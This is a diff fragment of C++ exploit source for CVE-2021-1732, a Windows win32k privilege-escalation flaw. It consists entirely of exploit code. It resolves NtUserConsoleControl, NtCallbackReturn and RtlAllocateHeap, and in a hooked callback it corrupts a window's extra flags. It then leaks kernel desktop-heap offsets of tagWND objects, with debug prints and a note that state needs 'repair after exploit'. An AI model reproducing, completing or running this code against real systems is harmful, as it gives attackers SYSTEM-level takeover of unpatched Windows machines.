@@ -11,10 +11,12 @@ namespace CVE_2021_1732
         }
         NtUserConsoleControl = (FNtUserConsoleControl)GetProcAddress(win32u, "NtUserConsoleControl");
         NtCallbackReturn = (FNtCallbackReturn)GetProcAddress(ntdll, "NtCallbackReturn");
+        RtlAllocateHeap = (FRtlAllocateHeap)GetProcAddress(ntdll, "RtlAllocateHeap");
         FindHMValidateHandle(&HMValidateHandle);
         if (!NtUserConsoleControl
             || !NtCallbackReturn
-            || !HMValidateHandle) {
+            || !HMValidateHandle
+            || !RtlAllocateHeap) {
             std::cerr << "[!] cant load functions\n";
             return false;
         }
@@ -68,11 +70,11 @@ namespace CVE_2021_1732
             ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
             ULONG_PTR hookResult[3] = { 0 };
 
-            // // 1. set hwndMagic extraFlag |= 0x800
+            // 1. set hwndMagic extraFlag |= 0x800
             ULONG_PTR ChangeOffset = 0;
             ConsoleCtrlInfo[0] = (ULONG_PTR)hwndMagic; // 第一个参数需要为窗口句柄
             ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;
-            // NTSTATUS ret = NtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));
+
             NTSTATUS ret = NtUserConsoleControl(6, reinterpret_cast<ULONG_PTR>(&ConsoleCtrlInfo), sizeof(ConsoleCtrlInfo));
             if (!NT_SUCCESS(ret)) {
                 printf("[x] Call NtUserConsoleControl failed\n");
@@ -91,13 +93,17 @@ namespace CVE_2021_1732
                 ULONG_PTR unused2;
             } result = { 0 };
             result.retvalue = *reinterpret_cast<ULONG_PTR*>(
-                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::KernelDesktopHeapBase));
+                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
             tag0_reverseBaseOffset = result.retvalue;
             tag1_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>(
-                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[1]) + offset::tagWND::tagWNDK::KernelDesktopHeapBase));
+                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[1]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
             tag2_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>( //need repair after exploit
-                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::KernelDesktopHeapBase));
-            printf("[+] Magic HWND offset to Desktop Heap base: 0x%p\n", tag2_reverseBaseOffset);
+                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
+            printf("[+] tagWNDK_0 Desktop heap offset: 0x%p\n", tag0_reverseBaseOffset);
+            printf("[+] tagWNDK_1 Desktop heap offset: 0x%p\n", tag1_reverseBaseOffset);
+            printf("[+] tagWNDK_2 Desktop heap offset: 0x%p\n", tag2_reverseBaseOffset);
+
+            printf("[+] Magic HWND offset to Desktop Heap base: 0x%p--->0x%p\n", tag2_reverseBaseOffset, result.retvalue);
             return NtCallbackReturn(reinterpret_cast<DWORD64*>(&result), sizeof(result), 0);
         }
     end:
